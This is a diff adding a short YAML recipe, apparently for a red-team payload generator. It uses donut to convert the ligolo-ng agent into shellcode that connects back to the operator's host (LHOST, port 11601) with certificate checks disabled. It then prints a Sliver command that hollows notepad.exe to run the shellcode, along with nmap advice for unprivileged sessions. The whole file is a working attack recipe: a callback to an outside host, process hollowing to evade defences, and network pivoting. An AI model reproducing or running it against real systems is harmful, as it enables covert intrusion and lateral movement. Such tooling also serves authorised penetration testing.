@@ -1,0 +1,15 @@
+description: "Convert the ligolo agent into shellcode with required arguments to connect back"
+variables:
+  donutPath: "/opt/donut/donut"
+  outputdir: "output/ligolo"
+  shellcodeFile: "agent.bin"
+  port: 11601
+print:
+- "Generated ligolo shellcode, in sliver run:"
+- "hollow C:/windows/system32/notepad.exe /mnt/generate/{{outputdir}}/{{shellcodeFile}}"
+- "Remember, if the session is not admin run nmap with --unprivileged or -PE and -Pn"
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{shellcodeFile}}"
+commands:
+- "{{donutPath}} -i /opt/ligolo-ng/agent.exe -a 2 -o {{outputdir}}/{{shellcodeFile}} -p '-connect {{LHOST}}:{{port}} -ignore-cert'"
